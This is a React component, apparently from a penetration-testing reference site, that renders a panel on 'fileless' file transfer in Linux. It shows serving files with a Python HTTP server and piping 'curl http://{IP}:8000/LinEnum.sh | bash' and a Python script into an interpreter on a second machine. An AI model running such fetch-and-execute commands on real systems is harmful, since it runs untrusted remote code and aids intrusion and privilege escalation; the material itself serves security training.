import {
    Typography,
    Accordion,
    AccordionSummary,
    AccordionDetails,
    Box,
  } from "@mui/material";
  import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
  import SyntaxHighlighter from "react-syntax-highlighter";
  import TreeView from '@mui/lab/TreeView';
import { TreeItem } from "@mui/lab";
import ChevronRightIcon from '@mui/icons-material/ChevronRight';
  
  interface IProps {
    title: string;
  }
  
  const FT_Fileless = ({ title }: IProps) => {

    return (
      <>
        {" "}
        <Accordion sx={{ backgroundColor: "primary.main" }}>
          <AccordionSummary
            expandIcon={<ExpandMoreIcon />}
            aria-controls="panel1a-content"
            id="panel1a-header"
          >
            <Typography>{title}</Typography>
          </AccordionSummary>
          <AccordionDetails
            sx={{ backgroundColor: "primary.background_accordian" }}
          >
            <Typography
              sx={{
                color: "primary.main",
              }}
            >
                <Typography variant="h6">
              Description
              </Typography>
              <Typography>
              Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
              </Typography>
              <Box pt={5}></Box>
              <Typography variant="h6">
              Step 1 - Machine 1
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {'python3 -m http.server 8000'}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.1 - Machine 2 Bash
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"curl http://{IP}:8000/LinEnum.sh | bash"}
            </SyntaxHighlighter>
            <Box pt={5}></Box>
            <Typography variant="h6">
            Step 2.2 - Machine 2 Python
              </Typography>
              <SyntaxHighlighter className="syntax" language="bash">
              {"curl http://{IP}:8000/helloworld.py | python3"}
            </SyntaxHighlighter>
            </Typography>
            <Box pt={5}></Box>
            <TreeView
              aria-label="file system navigator"
              defaultCollapseIcon={<ExpandMoreIcon />}
              defaultExpandIcon={<ChevronRightIcon />}
              sx={{ height: "fit-content", flexGrow: 1, maxWidth: 400, overflowY: 'auto', color: '#000000' }}
            >
              <TreeItem nodeId="1" label="Resources">
                
              </TreeItem>
            </TreeView>
          </AccordionDetails>
        </Accordion>
      </>
    );
  };

  
  export default FT_Fileless;
  